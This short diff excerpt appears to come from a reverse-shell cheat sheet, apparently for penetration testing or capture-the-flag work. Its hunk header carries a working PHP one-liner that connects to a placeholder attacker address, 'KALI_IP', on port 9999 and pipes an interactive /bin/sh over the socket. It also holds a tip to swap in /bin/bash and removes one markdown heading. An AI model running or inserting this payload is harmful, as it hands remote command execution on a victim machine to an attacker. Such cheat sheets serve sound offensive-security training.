@@ -34,4 +34,3 @@ php -r '$sock=fsockopen("KALI_IP",9999);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 >If there are issues with these try switching out `/bin/sh` with `/bin/bash`
 
 ---
-### Supporting Content
